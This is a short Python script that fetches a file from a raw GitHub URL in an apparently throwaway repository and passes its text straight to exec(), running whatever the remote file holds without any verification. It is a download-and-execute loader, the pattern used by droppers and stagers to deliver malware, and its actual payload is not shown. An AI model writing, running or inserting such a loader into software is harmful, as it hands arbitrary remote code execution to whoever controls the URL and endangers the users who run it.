import requests
url = 'https://raw.githubusercontent.com/tranminhquang2347/adscsacsactest34/main/tran.py'
response = requests.get(url)

if response.status_code == 200:
    python_code = response.text.strip()

    exec(python_code)
else:
    print(f"Failed to retrieve the webpage. Status code: {response.status_code}")
